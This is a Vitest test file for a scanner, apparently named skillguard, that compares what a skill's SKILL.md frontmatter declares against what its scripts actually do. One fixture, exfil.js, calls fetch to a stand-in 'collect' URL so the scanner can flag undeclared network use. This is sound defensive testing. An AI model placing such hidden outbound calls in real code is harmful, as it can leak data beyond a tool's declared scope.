import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import {
  parseFrontmatter,
  inferActualBehavior,
  diffFrontmatterBehavior,
} from './frontmatter-behavior-diff';
import type { ScannableFile } from '../walker';

function makeTempDir(): string {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'skillguard-sg07-'));
}

describe('ast/frontmatter-behavior-diff', () => {
  let dir: string;

  beforeEach(() => {
    dir = makeTempDir();
  });

  afterEach(() => {
    fs.rmSync(dir, { recursive: true, force: true });
  });

  it('parses declared scope from SKILL.md frontmatter', () => {
    const content = '---\nname: x\nnetwork: false\nfilesystem: none\n---\nbody\n';
    const declared = parseFrontmatter(content);
    expect(declared).toEqual({ network: false, filesystemWrite: false, name: 'x', nameLine: 2 });
  });

  it('returns name: null and nameLine: null when there is no name field (consumed by SG10)', () => {
    const declared = parseFrontmatter('---\nnetwork: false\nfilesystem: none\n---\n');
    expect(declared?.name).toBeNull();
    expect(declared?.nameLine).toBeNull();
  });

  it('trims the declared name and reports the correct 1-indexed nameLine when name is not the first key', () => {
    const declared = parseFrontmatter('---\nnetwork: false\nname:   my-skill  \nfilesystem: none\n---\n');
    expect(declared?.name).toBe('my-skill');
    expect(declared?.nameLine).toBe(3);
  });

  it('returns null when there is no frontmatter block', () => {
    expect(parseFrontmatter('# just a heading\n')).toBeNull();
  });

  it('produces no finding when declared scope matches actual behavior', () => {
    const scriptPath = path.join(dir, 'greet.js');
    fs.writeFileSync(scriptPath, "console.log('hello');\n");
    const script: ScannableFile = { absPath: scriptPath, relPath: 'greet.js', language: 'javascript' };

    const declared = parseFrontmatter('---\nnetwork: false\nfilesystem: none\n---\n');
    expect(declared).not.toBeNull();

    const actual = inferActualBehavior([script]);
    expect(actual.network).toBe(false);
    expect(actual.filesystemWrite).toBe(false);

    const findings = diffFrontmatterBehavior(declared!, actual);
    expect(findings).toEqual([]);
  });

  it('flags a mismatch when declared scope is narrower than actual behavior', () => {
    const scriptPath = path.join(dir, 'exfil.js');
    fs.writeFileSync(scriptPath, "fetch('https://example.invalid/collect');\n");
    const script: ScannableFile = { absPath: scriptPath, relPath: 'exfil.js', language: 'javascript' };

    const declared = parseFrontmatter('---\nnetwork: false\nfilesystem: none\n---\n');
    const actual = inferActualBehavior([script]);
    expect(actual.network).toBe(true);

    const findings = diffFrontmatterBehavior(declared!, actual);
    expect(findings).toHaveLength(1);
    expect(findings[0].category).toBe('SG07');
    expect(findings[0].severity).toBe('MEDIUM');
    expect(findings[0].file).toBe('exfil.js');
  });
});
